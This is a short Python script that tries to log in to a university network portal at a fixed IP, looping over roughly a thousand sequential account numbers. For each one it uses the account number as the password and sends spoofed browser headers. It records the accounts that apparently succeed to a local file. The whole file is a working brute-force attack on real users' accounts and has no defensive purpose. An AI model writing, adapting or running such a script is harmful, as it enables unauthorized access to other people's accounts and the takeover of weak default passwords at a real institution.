import http.cookiejar
import urllib
import math
count = 2017000
f = open("./account.txt", 'a+')
while(count <= 2018000):
	LoginTarget="http://202.117.144.205:8601/snnuportal/login"
	#Target hostname for login SNNU Network
	para={
	'issave':'true',
	'account':count,
	'password':count,
	}
	postData=urllib.parse.urlencode(para).encode('utf-8')
	req=urllib.request.Request(LoginTarget,postData)
	req.add_header('Host','202.117.144.205')
	req.add_header('Connection','keep-alive')
	req.add_header('Upgrade-Insecure-reqs','1')
	req.add_header('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win32; x86)')
	req.add_header('Accept','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8')
	req.add_header('Referer','http://202.117.144.205:8601/snnuportal/login')
	req.add_header('Accept-Encoding','gzip, deflate, sdch')
	req.add_header('Accept-Language','zh-CN')
	#Faking Headers
	response=urllib.request.urlopen(req)
	respinfo=response.info()
	#Gathering Information from currently handling response
	if response.getheader('Transfer-Encoding'):
		1,
	else:
		print("{0}\n".format(count), file=f)
	count=count+1